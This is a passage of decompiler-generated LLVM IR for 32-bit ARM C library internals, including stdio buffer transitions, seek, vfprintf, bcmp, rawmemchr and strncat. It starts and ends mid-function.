  %v4_19e14 = call i32 @__stdio_READ(i8* %v3_19e14, i32 %v2_19e08, i32 %v2_19e0c)
  %v0_19e18 = load i32, i32* @r4, align 4
  %v1_19e18 = add i32 %v0_19e18, 8
  %v2_19e18 = inttoptr i32 %v1_19e18 to i32*
  %v3_19e18 = load i32, i32* %v2_19e18, align 4
  store i32 %v3_19e18, i32* %r2.global-to-local, align 4
  %v2_19e1c = add i32 %v3_19e18, %v4_19e14
  %v2_19e20 = add i32 %v0_19e18, 20
  %v3_19e20 = inttoptr i32 %v2_19e20 to i32*
  store i32 %v2_19e1c, i32* %v3_19e20, align 4
  %v0_19e24 = load i32, i32* %r2.global-to-local, align 4
  %v1_19e24 = load i32, i32* @r4, align 4
  %v2_19e24 = add i32 %v1_19e24, 16
  %v3_19e24 = inttoptr i32 %v2_19e24 to i32*
  store i32 %v0_19e24, i32* %v3_19e24, align 4
  %v2_19e28 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19e28, i32* @r4, align 4
  ret i32 %v4_19e14

; uselistorder directives
  uselistorder i32 %v4_19e14, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_19e2c = load i32, i32* @r4, align 4
  store i32 %v3_19e2c, i32* %stack_var_-12, align 4
  %v0_19e30 = load i32, i32* @r0, align 4
  %v1_19e30 = inttoptr i32 %v0_19e30 to i8*
  %v2_19e30 = load i8, i8* %v1_19e30, align 1
  %v3_19e30 = zext i8 %v2_19e30 to i32
  store i32 %v3_19e30, i32* %r2.global-to-local, align 4
  %v1_19e34 = add i32 %v0_19e30, 1
  %v2_19e34 = inttoptr i32 %v1_19e34 to i8*
  %v3_19e34 = load i8, i8* %v2_19e34, align 1
  %v4_19e34 = zext i8 %v3_19e34 to i32
  store i32 %v4_19e34, i32* %r3.global-to-local, align 4
  %v4_19e38 = mul nuw nsw i32 %v4_19e34, 256
  %v5_19e38 = or i32 %v4_19e38, %v3_19e30
  store i32 %v5_19e38, i32* %r2.global-to-local, align 4
  %v1_19e3c = load i32, i32* @r1, align 4
  %v2_19e3c = and i32 %v1_19e3c, %v5_19e38
  %v4_19e3c = icmp eq i32 %v2_19e3c, 0
  store i32 %v0_19e30, i32* @r4, align 4
  br i1 %v4_19e3c, label %dec_label_pc_19e48, label %dec_label_pc_19e60

dec_label_pc_19e48:                               ; preds = %entry
  %v1_19e48 = and i32 %v5_19e38, 2176
  %v2_19e48 = icmp eq i32 %v1_19e48, 0
  br i1 %v2_19e48, label %dec_label_pc_19e50, label %dec_label_pc_19e74

dec_label_pc_19e50:                               ; preds = %dec_label_pc_19e48
  %v2_19e50 = or i32 %v1_19e3c, %v5_19e38
  store i32 %v2_19e50, i32* %r2.global-to-local, align 4
  %v3_19e54 = sdiv i32 %v2_19e50, 256
  store i32 %v3_19e54, i32* %r3.global-to-local, align 4
  %v1_19e58 = trunc i32 %v3_19e54 to i8
  store i8 %v1_19e58, i8* %v2_19e34, align 1
  %v0_19e5c = load i32, i32* %r2.global-to-local, align 4
  %v1_19e5c = trunc i32 %v0_19e5c to i8
  %v2_19e5c = load i32, i32* @r0, align 4
  %v3_19e5c = inttoptr i32 %v2_19e5c to i8*
  store i8 %v1_19e5c, i8* %v3_19e5c, align 1
  %v0_19e60.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19e60

dec_label_pc_19e60:                               ; preds = %entry, %dec_label_pc_19e50
  %v0_19e60 = phi i32 [ %v0_19e30, %entry ], [ %v0_19e60.pre, %dec_label_pc_19e50 ]
  %v1_19e60 = inttoptr i32 %v0_19e60 to i8*
  %v2_19e60 = load i8, i8* %v1_19e60, align 1
  %v3_19e60 = zext i8 %v2_19e60 to i32
  store i32 %v3_19e60, i32* %r2.global-to-local, align 4
  %v1_19e64 = add i32 %v0_19e60, 1
  %v2_19e64 = inttoptr i32 %v1_19e64 to i8*
  %v3_19e64 = load i8, i8* %v2_19e64, align 1
  %v4_19e64 = zext i8 %v3_19e64 to i32
  %v4_19e68 = mul nuw nsw i32 %v4_19e64, 256
  %v5_19e68 = or i32 %v4_19e68, %v3_19e60
  store i32 %v5_19e68, i32* %r3.global-to-local, align 4
  %v1_19e6c = and i32 %v3_19e60, 16
  store i32 %v1_19e6c, i32* %r5.global-to-local, align 4
  %v2_19e6c = icmp eq i32 %v1_19e6c, 0
  br i1 %v2_19e6c, label %dec_label_pc_19e9c, label %dec_label_pc_19e74

dec_label_pc_19e74:                               ; preds = %dec_label_pc_19e48, %dec_label_pc_19e60
  %v0_19e74 = call i32 @__errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_19e7c = inttoptr i32 %v0_19e74 to i32*
  store i32 9, i32* %v2_19e7c, align 4
  br label %dec_label_pc_19e80

dec_label_pc_19e80:                               ; preds = %dec_label_pc_19ea4, %dec_label_pc_19e74
  %v0_19e80 = load i32, i32* @r4, align 4
  %v1_19e80 = inttoptr i32 %v0_19e80 to i32*
  %v2_19e80 = load i32, i32* %v1_19e80, align 4
  %v1_19e84 = or i32 %v2_19e80, 8
  store i32 %v1_19e84, i32* %r3.global-to-local, align 4
  %v3_19e88 = sdiv i32 %v2_19e80, 256
  store i32 %v3_19e88, i32* %r2.global-to-local, align 4
  %v1_19e90 = trunc i32 %v3_19e88 to i8
  %v3_19e90 = add i32 %v0_19e80, 1
  %v4_19e90 = inttoptr i32 %v3_19e90 to i8*
  store i8 %v1_19e90, i8* %v4_19e90, align 1
  %v0_19e94 = load i32, i32* %r3.global-to-local, align 4
  %v1_19e94 = trunc i32 %v0_19e94 to i8
  %v2_19e94 = load i32, i32* @r4, align 4
  %v3_19e94 = inttoptr i32 %v2_19e94 to i8*
  store i8 %v1_19e94, i8* %v3_19e94, align 1
  %v2_19e98 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19e98, i32* @r4, align 4
  ret i32 -1

dec_label_pc_19e9c:                               ; preds = %dec_label_pc_19e60
  %v1_19e9c = and i32 %v3_19e60, 64
  %v2_19e9c = icmp eq i32 %v1_19e9c, 0
  br i1 %v2_19e9c, label %dec_label_pc_19ecc, label %dec_label_pc_19ea4

dec_label_pc_19ea4:                               ; preds = %dec_label_pc_19e9c
  %v0_19ea4 = call i32 @__stdio_wcommit()
  %v2_19ea8 = icmp eq i32 %v0_19ea4, 0
  br i1 %v2_19ea8, label %dec_label_pc_19eb0, label %dec_label_pc_19e80

dec_label_pc_19eb0:                               ; preds = %dec_label_pc_19ea4
  %v0_19eb0 = load i32, i32* @r4, align 4
  %v1_19eb0 = inttoptr i32 %v0_19eb0 to i32*
  %v2_19eb0 = load i32, i32* %v1_19eb0, align 4
  store i32 %v2_19eb0, i32* %r3.global-to-local, align 4
  %v1_19eb4 = add i32 %v0_19eb0, 8
  %v2_19eb4 = inttoptr i32 %v1_19eb4 to i32*
  %v3_19eb4 = load i32, i32* %v2_19eb4, align 4
  store i32 %v3_19eb4, i32* %r2.global-to-local, align 4
  %v1_19eb8 = and i32 %v2_19eb0, -65
  store i32 %v1_19eb8, i32* %r3.global-to-local, align 4
  %v3_19ebc = sdiv i32 %v2_19eb0, 256
  store i32 %v3_19ebc, i32* %r1.global-to-local, align 4
  %v2_19ec0 = add i32 %v0_19eb0, 28
  %v3_19ec0 = inttoptr i32 %v2_19ec0 to i32*
  store i32 %v3_19eb4, i32* %v3_19ec0, align 4
  %v0_19ec4 = load i32, i32* %r1.global-to-local, align 4
  %v1_19ec4 = trunc i32 %v0_19ec4 to i8
  %v2_19ec4 = load i32, i32* @r4, align 4
  %v3_19ec4 = add i32 %v2_19ec4, 1
  %v4_19ec4 = inttoptr i32 %v3_19ec4 to i8*
  store i8 %v1_19ec4, i8* %v4_19ec4, align 1
  %v0_19ec8 = load i32, i32* %r3.global-to-local, align 4
  %v1_19ec8 = trunc i32 %v0_19ec8 to i8
  %v2_19ec8 = load i32, i32* @r4, align 4
  %v3_19ec8 = inttoptr i32 %v2_19ec8 to i8*
  store i8 %v1_19ec8, i8* %v3_19ec8, align 1
  %v0_19ecc.pre = load i32, i32* @r4, align 4
  %v0_19ed8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19ecc

dec_label_pc_19ecc:                               ; preds = %dec_label_pc_19e9c, %dec_label_pc_19eb0
  %v0_19ed8 = phi i32 [ 0, %dec_label_pc_19e9c ], [ %v0_19ed8.pre, %dec_label_pc_19eb0 ]
  %v2_19edc = phi i32 [ %v0_19e60, %dec_label_pc_19e9c ], [ %v0_19ecc.pre, %dec_label_pc_19eb0 ]
  %v1_19ecc = inttoptr i32 %v2_19edc to i32*
  %v2_19ecc = load i32, i32* %v1_19ecc, align 4
  %v1_19ed0 = or i32 %v2_19ecc, 1
  store i32 %v1_19ed0, i32* %r3.global-to-local, align 4
  %v3_19ed4 = sdiv i32 %v2_19ecc, 256
  store i32 %v3_19ed4, i32* %r2.global-to-local, align 4
  %v1_19edc = trunc i32 %v3_19ed4 to i8
  %v3_19edc = add i32 %v2_19edc, 1
  %v4_19edc = inttoptr i32 %v3_19edc to i8*
  store i8 %v1_19edc, i8* %v4_19edc, align 1
  %v0_19ee0 = load i32, i32* %r3.global-to-local, align 4
  %v1_19ee0 = trunc i32 %v0_19ee0 to i8
  %v2_19ee0 = load i32, i32* @r4, align 4
  %v3_19ee0 = inttoptr i32 %v2_19ee0 to i8*
  store i8 %v1_19ee0, i8* %v3_19ee0, align 1
  %v2_19ee4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19ee4, i32* @r4, align 4
  ret i32 %v0_19ed8

; uselistorder directives
  uselistorder i32 %v3_19ed4, { 1, 0 }
  uselistorder i32 %v3_19e88, { 1, 0 }
  uselistorder i32 %v3_19e60, { 1, 2, 0, 3 }
  uselistorder i32 %v0_19e60, { 0, 2, 1 }
  uselistorder i32 %v3_19e54, { 1, 0 }
  uselistorder i32 %v5_19e38, { 0, 2, 1, 3 }
  uselistorder i32 ()* @__stdio_wcommit, { 5, 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_19ecc, { 1, 0 }
  uselistorder label %dec_label_pc_19e74, { 1, 0 }
  uselistorder label %dec_label_pc_19e60, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v1_19ef0 = add i32 %arg1, 4
  %v2_19ef0 = inttoptr i32 %v1_19ef0 to i32*
  %v3_19ef0 = load i32, i32* %v2_19ef0, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_19ef8 = load i32, i32* %arg2, align 4
  %v3_19ef8 = add i32 %tmp, 4
  %v4_19ef8 = inttoptr i32 %v3_19ef8 to i32*
  %v5_19ef8 = load i32, i32* %v4_19ef8, align 4
  %v6_19efc = call i32 @__libc_lseek64(i32 %v3_19ef0, i32 %v2_19ef8, i32 %v5_19ef8, i32 %arg3)
  %v1_19f00 = icmp slt i32 %v2_19ef8, 0
  %v6_19efc. = select i1 %v1_19f00, i32 %v6_19efc, i32 0
  store i32 %v6_19efc., i32* %r3.global-to-local, align 4
  br i1 %v1_19f00, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v3_19f0c = load i32, i32* @r4, align 4
  %v4_19f0c = inttoptr i32 %v3_19f0c to i32*
  store i32 %v6_19efc, i32* %v4_19f0c, align 4
  %v6_19f0c = add i32 %v3_19f0c, 4
  %v7_19f0c = inttoptr i32 %v6_19f0c to i32*
  store i32 %v2_19ef8, i32* %v7_19f0c, align 4
  %v0_19f10.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v0_19f10 = phi i32 [ %v6_19efc, %entry ], [ %v0_19f10.pre, %bb ]
  ret i32 %v0_19f10

; uselistorder directives
  uselistorder i32 %v6_19efc, { 0, 2, 1 }
  uselistorder i32 %v2_19ef8, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_lseek64, { 0, 3, 2, 1, 4 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_vfprintf() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v6_19f18 = load i32, i32* @r5, align 4
  %v12_19f18 = load i32, i32* @r7, align 4
  %v15_19f18 = load i32, i32* @r8, align 4
  %v0_19f1c = load i32, i32* @r0, align 4
  %v1_19f1c = add i32 %v0_19f1c, 52
  %v2_19f1c = inttoptr i32 %v1_19f1c to i32*
  %v3_19f1c = load i32, i32* %v2_19f1c, align 4
  store i32 %v3_19f1c, i32* @r8, align 4
  %v1_19f20 = add i32 %v0_19f1c, 56
  store i32 %v1_19f20, i32* @r5, align 4
  %v2_19f24 = ptrtoint i32* %stack_var_-40 to i32
  %v2_19f28 = icmp eq i32 %v3_19f1c, 0
  store i32 %v0_19f1c, i32* @r4, align 4
  %v0_19f30 = load i32, i32* @r1, align 4
  store i32 %v0_19f30, i32* @r7, align 4
  %v0_19f34 = load i32, i32* @r2, align 4
  store i32 %v0_19f34, i32* @r6, align 4
  store i32 %v2_19f24, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 %v1_19f20, i32* @r2, align 4
  br i1 %v2_19f28, label %dec_label_pc_19f48, label %dec_label_pc_19f64

dec_label_pc_19f48:                               ; preds = %entry
  %v1_19f50 = call i32 @__pthread_cleanup_push_defer()
  %v0_19f54 = load i32, i32* @r5, align 4
  store i32 106340, i32* @lr, align 4
  %v2_19f60 = call i32 @pthread_mutex_lock(i32 %v0_19f54)
  %v0_19f64.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19f64

dec_label_pc_19f64:                               ; preds = %entry, %dec_label_pc_19f48
  %v0_19f74 = phi i32 [ %v0_19f1c, %entry ], [ %v0_19f64.pre, %dec_label_pc_19f48 ]
  %v1_19f64 = inttoptr i32 %v0_19f74 to i8*
  %v2_19f64 = load i8, i8* %v1_19f64, align 1
  %v2_19f6c = icmp ugt i8 %v2_19f64, -65
  br i1 %v2_19f6c, label %dec_label_pc_19f8c, label %dec_label_pc_19f7c

dec_label_pc_19f7c:                               ; preds = %dec_label_pc_19f64
  %v3_19f7c = call i32 @__stdio_trans2w_o(i8* %v1_19f64, i32 128)
  %v2_19f80 = icmp eq i32 %v3_19f7c, 0
  store i32 -1, i32* @r5, align 4
  br i1 %v2_19f80, label %dec_label_pc_19f7c.dec_label_pc_19f8c_crit_edge, label %dec_label_pc_19fa0

dec_label_pc_19f7c.dec_label_pc_19f8c_crit_edge:  ; preds = %dec_label_pc_19f7c
  %v0_19f94.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19f8c

dec_label_pc_19f8c:                               ; preds = %dec_label_pc_19f7c.dec_label_pc_19f8c_crit_edge, %dec_label_pc_19f64
  %v0_19f94 = phi i32 [ %v0_19f94.pre, %dec_label_pc_19f7c.dec_label_pc_19f8c_crit_edge ], [ %v0_19f74, %dec_label_pc_19f64 ]
  %v0_19f8c = load i32, i32* @r7, align 4
  %v0_19f90 = load i32, i32* @r6, align 4
  %v3_19f98 = inttoptr i32 %v0_19f8c to i8*
  %v4_19f98 = call i32 @_vfprintf_internal(i32 %v0_19f94, i8* %v3_19f98, i32 %v0_19f90)
  store i32 %v4_19f98, i32* @r5, align 4
  br label %dec_label_pc_19fa0

dec_label_pc_19fa0:                               ; preds = %dec_label_pc_19f7c, %dec_label_pc_19f8c
  %v0_19fb85 = phi i32 [ -1, %dec_label_pc_19f7c ], [ %v4_19f98, %dec_label_pc_19f8c ]
  %v0_19fa0 = load i32, i32* @r8, align 4
  %v2_19fa0 = icmp eq i32 %v0_19fa0, 0
  br i1 %v2_19fa0, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_19fa0
  call void @__pseudo_branch(i32 58236)
  %v0_19fb8.pre = load i32, i32* @r5, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_19fa0, %bb
  %v0_19fb8 = phi i32 [ %v0_19fb85, %dec_label_pc_19fa0 ], [ %v0_19fb8.pre, %bb ]
  store i32 %v6_19f18, i32* @r5, align 4
  store i32 %v12_19f18, i32* @r7, align 4
  store i32 %v15_19f18, i32* @r8, align 4
  ret i32 %v0_19fb8

; uselistorder directives
  uselistorder i32 58236, { 0, 1, 6, 7, 8, 2, 9, 10, 3, 4, 5, 11, 12 }
  uselistorder i32 (i32, i8*, i32)* @_vfprintf_internal, { 1, 0 }
  uselistorder i32 (i32)* @pthread_mutex_lock, { 18, 15, 41, 6, 24, 23, 22, 21, 17, 16, 14, 5, 40, 52, 51, 36, 4, 1, 39, 38, 3, 2, 12, 11, 10, 19, 27, 26, 25, 29, 28, 13, 9, 37, 8, 7, 32, 31, 30, 50, 49, 53, 48, 47, 0, 46, 45, 44, 43, 42, 20, 35, 34, 33 }
  uselistorder i32 ()* @__pthread_cleanup_push_defer, { 9, 6, 27, 15, 14, 13, 12, 11, 8, 7, 5, 0, 26, 29, 28, 24, 10, 18, 17, 16, 20, 19, 4, 3, 25, 2, 1, 23, 22, 21 }
  uselistorder i32 ptrtoint (i8* @global_var_f360.273 to i32), { 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 52, { 9, 10, 0, 11, 7, 5, 2, 8, 6, 3, 4, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_19fa0, { 1, 0 }
  uselistorder label %dec_label_pc_19f64, { 1, 0 }
}

define i32 @bcmp(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v1_19fe0 = add i32 %arg2, -1
  %v6_19fe0 = icmp slt i32 %v1_19fe0, 0
  br i1 %v6_19fe0, label %bb, label %.thread

bb:                                               ; preds = %entry
  ret i32 0

.thread:                                          ; preds = %entry
  %v2_19fec = add i32 %v1_19fe0, %tmp
  %v0_19ff4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_19ff0

dec_label_pc_19ff0:                               ; preds = %bb6, %.thread
  %v0_19ff4 = phi i32 [ %v0_19ff4.pre, %.thread ], [ %v5_19ff4, %bb6 ]
  %v0_19ff0 = phi i32 [ %tmp, %.thread ], [ %v5_19ff0, %bb6 ]
  %v1_19ff0 = inttoptr i32 %v0_19ff0 to i8*
  %v2_19ff0 = load i8, i8* %v1_19ff0, align 1
  %v3_19ff0 = zext i8 %v2_19ff0 to i32
  %v5_19ff0 = add i32 %v0_19ff0, 1
  %v1_19ff4 = inttoptr i32 %v0_19ff4 to i8*
  %v2_19ff4 = load i8, i8* %v1_19ff4, align 1
  %v3_19ff4 = zext i8 %v2_19ff4 to i32
  %v3_19ff8 = icmp ult i32 %v2_19fec, %v5_19ff0
  %v3_19ffc = sub nsw i32 %v3_19ff0, %v3_19ff4
  br i1 %v3_19ff8, label %dec_label_pc_1a004, label %bb6

bb6:                                              ; preds = %dec_label_pc_19ff0
  %v5_19ff4 = add i32 %v0_19ff4, 1
  %v10_19ffc = icmp eq i8 %v2_19ff0, %v2_19ff4
  br i1 %v10_19ffc, label %dec_label_pc_19ff0, label %dec_label_pc_1a004

dec_label_pc_1a004:                               ; preds = %dec_label_pc_19ff0, %bb6
  ret i32 %v3_19ffc

; uselistorder directives
  uselistorder i32 %v5_19ff0, { 1, 0 }
  uselistorder i32 %v0_19ff0, { 1, 0 }
  uselistorder i32 %v0_19ff4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_1a004, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1a034:
  %v1_1a014 = urem i32 %arg1, 256
  store i32 %v1_1a014, i32* @lr, align 4
  %v4_1a034 = mul nuw nsw i32 %v1_1a014, 256
  %v5_1a034 = or i32 %v4_1a034, %v1_1a014
  %v4_1a03c = mul i32 %v5_1a034, 65536
  %v5_1a03c = or i32 %v4_1a03c, %v5_1a034
  %v0_1a040.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_1a040

dec_label_pc_1a040:                               ; preds = %dec_label_pc_1a0ac, %dec_label_pc_1a040, %dec_label_pc_1a034
  %v0_1a040 = phi i32 [ %v0_1a040.pre, %dec_label_pc_1a034 ], [ %v4_1a040, %dec_label_pc_1a040 ], [ %v4_1a040, %dec_label_pc_1a0ac ]
  %v1_1a040 = inttoptr i32 %v0_1a040 to i32*
  %v2_1a040 = load i32, i32* %v1_1a040, align 4
  %v4_1a040 = add i32 %v0_1a040, 4
  store i32 %v4_1a040, i32* @ip, align 4
  %v2_1a048 = xor i32 %v2_1a040, %v5_1a03c
  %v2_1a04c = add i32 %v2_1a048, 2130640639
  %v1_1a054 = sub i32 -1, %v2_1a048
  %v2_1a058 = xor i32 %v2_1a04c, %v1_1a054
  %v2_1a05c = and i32 %v2_1a058, -2130640640
  %v2_1a060 = icmp eq i32 %v2_1a05c, 0
  br i1 %v2_1a060, label %dec_label_pc_1a040, label %dec_label_pc_1a068

dec_label_pc_1a068:                               ; preds = %dec_label_pc_1a040
  %v2_1a068 = inttoptr i32 %v0_1a040 to i8*
  %v3_1a068 = load i8, i8* %v2_1a068, align 1
  %v4_1a068 = zext i8 %v3_1a068 to i32
  %v9_1a070 = icmp eq i32 %v4_1a068, %v1_1a014
  %v1_1a074 = add i32 %v0_1a040, 3
  %v1_1a078 = add i32 %v0_1a040, 1
  %v1_1a07c = add i32 %v0_1a040, 2
  br i1 %v9_1a070, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_1a068
  ret i32 %v0_1a040

bb18:                                             ; preds = %dec_label_pc_1a068
  %v2_1a084 = inttoptr i32 %v1_1a078 to i8*
  %v3_1a084 = load i8, i8* %v2_1a084, align 1
  %v4_1a084 = zext i8 %v3_1a084 to i32
  %v9_1a088 = icmp eq i32 %v4_1a084, %v1_1a014
  br i1 %v9_1a088, label %dec_label_pc_1a090, label %dec_label_pc_1a098

dec_label_pc_1a090:                               ; preds = %bb18
  ret i32 %v1_1a078

dec_label_pc_1a098:                               ; preds = %bb18
  %v2_1a098 = inttoptr i32 %v1_1a07c to i8*
  %v3_1a098 = load i8, i8* %v2_1a098, align 1
  %v4_1a098 = zext i8 %v3_1a098 to i32
  %v9_1a09c = icmp eq i32 %v4_1a098, %v1_1a014
  br i1 %v9_1a09c, label %dec_label_pc_1a0a4, label %dec_label_pc_1a0ac

dec_label_pc_1a0a4:                               ; preds = %dec_label_pc_1a098
  ret i32 %v1_1a07c

dec_label_pc_1a0ac:                               ; preds = %dec_label_pc_1a098
  %v2_1a0ac = inttoptr i32 %v1_1a074 to i8*
  %v3_1a0ac = load i8, i8* %v2_1a0ac, align 1
  %v4_1a0ac = zext i8 %v3_1a0ac to i32
  %v9_1a0b0 = icmp eq i32 %v4_1a0ac, %v1_1a014
  br i1 %v9_1a0b0, label %dec_label_pc_1a0b8, label %dec_label_pc_1a040

dec_label_pc_1a0b8:                               ; preds = %dec_label_pc_1a0ac
  ret i32 %v1_1a074

; uselistorder directives
  uselistorder i32 %v4_1a040, { 2, 1, 0 }
  uselistorder i32 %v0_1a040, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1a034, { 1, 0 }
  uselistorder i32 %v1_1a014, { 2, 3, 4, 5, 6, 0, 1 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1a0c8 = load i32, i32* @r4, align 4
  store i32 %v3_1a0c8, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1a0d4

dec_label_pc_1a0d4:                               ; preds = %dec_label_pc_1a0d4, %entry
  %v0_1a0d4 = phi i32 [ %v5_1a0d4, %dec_label_pc_1a0d4 ], [ %tmp, %entry ]
  %v1_1a0d4 = inttoptr i32 %v0_1a0d4 to i8*
  %v2_1a0d4 = load i8, i8* %v1_1a0d4, align 1
  %v3_1a0d4 = zext i8 %v2_1a0d4 to i32
  store i32 %v3_1a0d4, i32* %ip.global-to-local, align 4
  %v5_1a0d4 = add i32 %v0_1a0d4, 1
  store i32 %v5_1a0d4, i32* %r3.global-to-local, align 4
  %v2_1a0d8 = icmp eq i8 %v2_1a0d4, 0
  store i1 %v2_1a0d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a0d8, label %dec_label_pc_1a0e0, label %dec_label_pc_1a0d4

dec_label_pc_1a0e0:                               ; preds = %dec_label_pc_1a0d4
  %v0_1a0e0 = load i32, i32* %r2.global-to-local, align 4
  %v7_1a0e0 = icmp eq i32 %v0_1a0e0, 3
  store i1 %v7_1a0e0, i1* %cpsr_z.global-to-local, align 1
  %v1_1a0e4 = add i32 %v0_1a0d4, -1
  store i32 %v1_1a0e4, i32* %lr.global-to-local, align 4
  %tmp10 = icmp ult i32 %v0_1a0e0, 4
  br i1 %tmp10, label %dec_label_pc_1a178thread-pre-split, label %dec_label_pc_1a0ec

dec_label_pc_1a0ec:                               ; preds = %dec_label_pc_1a0e0
  %v3_1a0ec = udiv i32 %v0_1a0e0, 4
  store i32 %v3_1a0ec, i32* %r0.global-to-local, align 4
  %v0_1a0f0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1a0f0

dec_label_pc_1a0f0:                               ; preds = %dec_label_pc_1a150, %dec_label_pc_1a0ec
  %v2_1a0f8 = phi i32 [ %v1_1a148, %dec_label_pc_1a150 ], [ %v1_1a0e4, %dec_label_pc_1a0ec ]
  %v0_1a0f0 = phi i32 [ %v1_1a144, %dec_label_pc_1a150 ], [ %v0_1a0f0.pre, %dec_label_pc_1a0ec ]
  %v1_1a0f0 = inttoptr i32 %v0_1a0f0 to i8*
  %v2_1a0f0 = load i8, i8* %v1_1a0f0, align 1
  %v3_1a0f0 = zext i8 %v2_1a0f0 to i32
  store i32 %v3_1a0f0, i32* %r3.global-to-local, align 4
  %v2_1a0f4 = icmp eq i8 %v2_1a0f0, 0
  store i1 %v2_1a0f4, i1* %cpsr_z.global-to-local, align 1
  %v3_1a0f8 = add i32 %v2_1a0f8, 1
  %v4_1a0f8 = inttoptr i32 %v3_1a0f8 to i8*
  store i8 %v2_1a0f0, i8* %v4_1a0f8, align 1
  %v0_1a0fc = load i32, i32* %lr.global-to-local, align 4
  %v1_1a0fc = add i32 %v0_1a0fc, 1
  store i32 %v1_1a0fc, i32* %ip.global-to-local, align 4
  %v0_1a100 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a100, label %.loopexit, label %dec_label_pc_1a104

dec_label_pc_1a104:                               ; preds = %dec_label_pc_1a0f0
  %v0_1a104 = load i32, i32* @r1, align 4
  %v1_1a104 = add i32 %v0_1a104, 1
  %v2_1a104 = inttoptr i32 %v1_1a104 to i8*
  %v3_1a104 = load i8, i8* %v2_1a104, align 1
  %v4_1a104 = zext i8 %v3_1a104 to i32
  store i32 %v4_1a104, i32* %r3.global-to-local, align 4
  %v2_1a108 = icmp eq i8 %v3_1a104, 0
  store i1 %v2_1a108, i1* %cpsr_z.global-to-local, align 1
  %v3_1a10c = add i32 %v0_1a0fc, 2
  %v4_1a10c = inttoptr i32 %v3_1a10c to i8*
  store i8 %v3_1a104, i8* %v4_1a10c, align 1
  %v0_1a110 = load i32, i32* @r1, align 4
  %v1_1a110 = add i32 %v0_1a110, 1
  store i32 %v1_1a110, i32* %r1.global-to-local, align 4
  %v0_1a114 = load i32, i32* %ip.global-to-local, align 4
  %v1_1a114 = add i32 %v0_1a114, 1
  store i32 %v1_1a114, i32* %ip.global-to-local, align 4
  %v0_1a118 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a118, label %.loopexit, label %dec_label_pc_1a11c

dec_label_pc_1a11c:                               ; preds = %dec_label_pc_1a104
  %v1_1a11c = add i32 %v0_1a110, 2
  %v2_1a11c = inttoptr i32 %v1_1a11c to i8*
  %v3_1a11c = load i8, i8* %v2_1a11c, align 1
  %v4_1a11c = zext i8 %v3_1a11c to i32
  store i32 %v4_1a11c, i32* %r3.global-to-local, align 4
  %v2_1a120 = icmp eq i8 %v3_1a11c, 0
  store i1 %v2_1a120, i1* %cpsr_z.global-to-local, align 1
  %v3_1a124 = add i32 %v0_1a114, 2
  %v4_1a124 = inttoptr i32 %v3_1a124 to i8*
  store i8 %v3_1a11c, i8* %v4_1a124, align 1
  %v0_1a128 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a128 = add i32 %v0_1a128, 1
  store i32 %v1_1a128, i32* %r1.global-to-local, align 4
  %v0_1a12c = load i32, i32* %ip.global-to-local, align 4
